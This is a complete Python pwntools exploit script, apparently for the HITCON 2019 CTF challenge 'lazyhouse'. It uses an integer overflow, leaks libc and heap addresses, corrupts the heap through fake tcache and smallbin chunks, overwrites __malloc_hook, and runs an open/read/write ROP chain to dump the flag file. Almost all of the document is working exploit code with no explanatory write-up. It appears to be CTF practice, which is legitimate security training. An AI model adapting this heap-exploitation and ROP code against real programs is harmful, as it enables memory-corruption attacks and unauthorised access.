from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './lazyhouse'
HOST = ''
PORT = 0

elf = ELF(TARGET)
def start():
    if not args.R:
        print "local"
        # return process(TARGET)
        return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print "remote"
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

r = start()
if args.D:
    debug(r, [0x1ef7])

def buy(idx, size, name):
    r.sendlineafter('choice: ', '1')
    r.sendlineafter('dex:', str(idx))
    r.sendlineafter('Size:', str(size))
    if size < 0x10000:
        r.sendafter('House:', name)

def show(idx):
    r.sendlineafter('choice: ', '2')
    r.sendlineafter('dex:', str(idx))

def sell(idx):
    r.sendlineafter('choice: ', '3')
    r.sendlineafter('dex:', str(idx))

def upgrade(idx, name):
    r.sendlineafter('choice: ', '4')
    r.sendlineafter('dex:', str(idx))
    r.sendafter('House:', name)
def get_super(name):
    r.sendlineafter('choice: ', '5')
    r.sendafter('House:', name)
    



# earn money
size = (pow(2, 64) / 0xda) + 1
buy(0, size, 'A')
sell(0)

# leak
buy(0, 0x80, 'A')
buy(1, 0x440, 'A')
buy(2, 0x80, 'A')

sell(1)
buy(1, 0x450, 'A')

upgrade(0, 'A'*0x80+p64(0)+p64(0x453).strip('\x00'))
buy(7, 0x440, 'A'*8)
show(7)

r.recv(8)
leak = r.recv(0x10)
libc_leak = u64(leak[0:8])
heap_leak = u64(leak[8:0x10])

dbg("libc_leak")
dbg("heap_leak")
libc_base = libc_leak - 0x1e50a0
heap_base = heap_leak & 0xfffffffffffff000

smallbin = libc_base + 0x1e4eb0
tcache_fake_chunk = heap_base + 0x40
dbg("libc_base")
dbg("heap_base")

dbg("smallbin")

mh = libc_base + 0x1e4c30
syscall = libc_base + 0x000cf6c5
rax = libc_base + 0x00047cf7
rdi = libc_base + 0x00026542
rsi = libc_base + 0x00026f9e
rdx = libc_base + 0x0012bda6
leave_ret = libc_base + 0x00058373

sell(0)
sell(1)
sell(2)

target = heap_base + 0x7d0

buy(6, 0x80, flat(0, 0x231, target+8, target+0x10, target))
buy(5, 0x80, 'C')
buy(0, 0x80, 'D')
buy(1, 0x80, 'E')

buy(2, 0x450, 'F')

upgrade(1, '\x00'*0x80+p64(0x230)+p64(0x460)) 
sell(2)
show(0)

payload = ''
payload += '\x11' * 0x78
payload += p64(0x6c1)
payload += p64(0) * (8 * 2 + 1)
payload += p64(0x31)
payload += p64(0) * (8 * 2 + 1)
payload += p64(0x21)

buy(2, 0x440, payload)
sell(0)
sell(1)
sell(2)


buy(0, 0x1a0, p64(0)*15+p64(0x6c1))

buy(1, 0x210, 'A')
buy(2, 0x210, 'A')
sell(2)

buy(2, 0x210, '\x22'*0x148+p64(0xd1))
sell(2)

for i in range(5):
    buy(2, 0x210, 'A')
    sell(2)

# buy(2, 0x3a0, 'A'*0x3a0)
# sell(2)

sell(1)
buy(1, 0x220, 'A')
sell(5)


payload = ''
payload += '\x00' * 0x98 + p64(0x31)
payload += p64(tcache_fake_chunk)
payload += '\x00' * 0x80 + p64(0x221) 
payload += flat(smallbin, tcache_fake_chunk)

buy(5, 0x6b0, payload) # rop payload

name = "/home/jt/Downloads/hitcon2019/lazy/lazy/flag"
rop = ''
rop += name.ljust(0x40, '\x00')
rop += flat(rax, 2, rdi, heap_base+0x990, rsi, 0, rdx, 0,  syscall) 
rop += flat(rax, 0, rdi, 3, rsi, heap_base+0x980, rdx, 0x40, syscall) 
rop += flat(rax, 1, rdi, 1, rsi, heap_base+0x980, rdx, 0x40, syscall) 

buy(3, 0x210, rop) 

buy(2, 0x210, '\x33'*(0x20*8)+p64(mh)) # overwrite tps
get_super(p64(leave_ret))
show(5)

r.sendlineafter('choice: ', '1')
r.sendlineafter('dex:', str('4'))
r.sendlineafter('Size:', str(heap_base + 0x980 + 0x40+8))

r.interactive()
r.close()




